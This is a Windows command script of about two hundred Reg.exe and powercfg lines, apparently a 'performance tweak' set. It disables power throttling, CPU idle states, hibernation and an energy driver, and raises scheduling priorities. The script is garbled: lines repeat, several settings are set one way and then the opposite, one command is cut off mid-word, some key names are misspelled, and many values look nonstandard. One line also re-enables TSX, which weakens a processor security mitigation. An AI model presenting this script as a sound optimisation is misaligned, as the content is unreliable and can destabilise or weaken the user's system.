Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\csrss.exe\PerfOptions" /v "IoPriority" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Background Only" /t REG_SZ /d "True" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Clock Rate" /t REG_DWORD /d "10000" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "GPU Priority" /t REG_DWORD /d "8" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Priority" /t REG_DWORD /d "5" /f
Reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile\Tasks\Window Manager" /v "Scheduling Category" /t REG_SZ /d "Medium" /f
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "CapPercentage" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\HardCap0" /v "SchedulingType" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "CapPercentage" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\Paused" /v "SchedulingType" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "CapPercentage" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapFull" /v "SchedulingType" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "CapPercentage" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\CPU\SoftCapLow" /v "SchedulingType" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\BackgroundDefault" /v "IsLowPriority" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\Frozen" /v "IsLowPriority" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNCS" /v "IsLowPriority" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\FrozenDNK" /v "IsLowPriority" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\PrelaunchForeground" /v "IsLowPriority" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Flags\ThrottleGPUInterference" /v "IsLowPriority" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Critical" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\CriticalNoUi" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\EmptyHostPPLE" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\High" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\High" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Low" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Low" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Lowest" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Lowest" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Medium" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\Medium" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\MediumHigh" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\MediumHigh" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "BasePriority" /t REG_DWORD /d "82" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\StartHost" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Importance\VeryLow" /v "OverTargetPriority" /t REG_DWORD /d "50" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\IO\NoCap" /v "IOBandwidth" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitLimit" /t REG_DWORD /d "4294967295" /f 
Reg.exe add "HKLM\SYSTEM\ResourcePolicyStore\ResourceSets\Policies\Memory\NoCap" /v "CommitTarget" /t REG_DWORD /d "4294967295" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\893dee8e-2bef-41e0-89c6-b55d0929964c\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ValueMax" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMax" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet002\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\0cc5b647-c1df-4637-891a-dec35c318583" /v "ValueMin" /t REG_DWORD /d "0" /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v Class2InitialUnparkCount /t REG_DWORD /d 100 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v EnergyEstimationDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PerfBoostAtGuaranteed /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PpmMfBufferingThreshold /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v MfOverridesDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PpmMfOverridesDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v UserBatteryDischargeEstimator /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PowerThrottlingOff /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling /v PowerThrottlingOff /t REG_DWORD /d 1 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PerfLevelSrc" /t REG_DWORD /d "2222" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerMizerEnable" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerMizerLevel" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e968-e325-11ce-bfc1-08002be10318}\0000" /v "PowerMizerLevelAC" /t REG_DWORD /d "0" /f
powercfg -setacvalueindex scheme_current sub_processor PERFAUTONOMOUS 1
Powercfg -setactive scheme_current
powercfg -setacvalueindex scheme_current sub_processor PERFAUTONOMOUSWINDOW 20000
Powercfg -setactive scheme_current
powercfg -setacvalueindex scheme_current sub_processor PERFCHECK 20
Powercfg -setactive scheme_curre
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "PlatformAoAcOverride" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EventProcessorEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "CsEnabled" /t REG_DWORD /d "0" /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v AwayModeEnabled /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v Class1InitialUnparkCount /t REG_DWORD /d 100 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v CsEnabled /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v CustomizeDuringSetup /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v EnergyEstimationEnabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v HiberFileSizePercent /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v HibernateEnabled /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v MfBufferingThreshold /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PerfCalculateActualUtilization /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v TimerRebaseThresholdOnDripsExit /t REG_DWORD /d 30 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v EventProcessorEnabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v HiberFileType /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v Class2InitialUnparkCount /t REG_DWORD /d 100 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v EnergyEstimationDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PerfBoostAtGuaranteed /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PpmMfBufferingThreshold /t REG_DWORD /d 0 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v MfOverridesDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PpmMfOverridesDisabled /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v UserBatteryDischargeEstimator /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power /v PowerThrottlingOff /t REG_DWORD /d 1 /f
Reg.exe add HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling /v PowerThrottlingOff /t REG_DWORD /d 1 /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "HiberbootEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDr" /v "Start" /t REG_DWORD /d "4" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HibernateEnabled" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "SleepReliabilityDetailedDiagnostics" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "DisableTaggedEnergyLogging" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxApplication" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "TelemetryMaxTagPerApplication" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\TaggedEnergy" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SD\IdleState\1" /v "IdleExitEnergyMicroJoules" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SD\IdleState\1" /v "IdleExitLatencyMs" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SD\IdleState\1" /v "IdlePowerMw" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SD\IdleState\1" /v "IdleTimeLengthMs" /t REG_DWORD /d "4294967295" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\1" /v "IdleExitEnergyMicroJoules" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\2" /v "IdleExitLatencyMs" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\2" /v "IdlePowerMw" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\2" /v "IdleTimeLengthMs" /t REG_DWORD /d "4294967295" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\3" /v "IdleExitEnergyMicroJoules" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\3" /v "IdleExitLatencyMs" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\3" /v "IdlePowerMw" /t REG_DWORD /d "0" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\EnergyEstimation\Storage\SSD\IdleState\3" /v "IdleTimeLengthMs" /t REG_DWORD /d "4294967295" /f 
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DistributeTimers" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" /v "DisableTsx" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Power" /v "CoalescingTimerInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EnergyEstimationEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "EventProcessorEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\943c8cb6-6f93-4227-ad87-e9a3feec08d1" /v "Attributes" /t REG_DWORD /d "2" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\2a737441-1930-4402-8d77-b2bebba308a3\d4e98f31-5ffe-4ce1-be31-1b38b384c009\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\381b4222-f694-41f0-9685-ff5bb260df2e" /v "DCSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\54533251-82be-4824-96c1-47b60b740d00\3b04d4fd-1cc7-4f23-ab1c-d1337819c4bb\DefaultPowerSchemeValues\8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c" /v "ACSettingIndex" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "AllowPepPerfStates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WcmSvc\GroupPolicy" /v "fDisablePowerManagement" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PDC\Activators\Default\VetoPolicy" /v "EA:EnergySaverEngaged" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PDC\Activators\28\VetoPolicy" /v "EA:PowerStateDischarging" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Misc" /v "DeviceIdlePolicy" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "PerfEnergyPreference" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMinCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPMaxCores1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CpLatencyHintUnpark" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance1" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "MaxPerformance" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPDistribution1" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKCU\Control Panel\PowerCfg\GlobalPowerPolicy" /v "Policies" /t REG_BINARY /d "01000000020000000100000000000000020000000000000000000000000000002c0100003232030304000000040000000000000000000000840300002c01000000000000840300000001646464640000" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Cstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Processor" /v "Capabilities" /t REG_DWORD /d "516198" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "HighestPerformance" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MinimumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumThrottlePercent" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "Class1InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "InitialUnparkCount" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power" /v "MaximumPerformancePercent" /t REG_DWORD /d "100" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v "PowerThrottlingOff" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPHEADROOM" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Power\Policy\Settings\Processor" /v "CPCONCURRENCY" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleThreshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdle" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuLatencyTimer" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuSlowdown" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "DedicatedSegmentSize" /t REG_DWORD /d "1298" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "Threshold" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuDebuggingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "ProccesorLatencyThrottlingEnabled" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubDelay" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubInterval" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubPower" /t REG_DWORD /d "18" /f
Reg.exe add "HKLM\SYSTEM\ControlSet001\Control\Processor" /v "CpuIdleScrubThreshold" /t REG_DWORD /d "0" /f
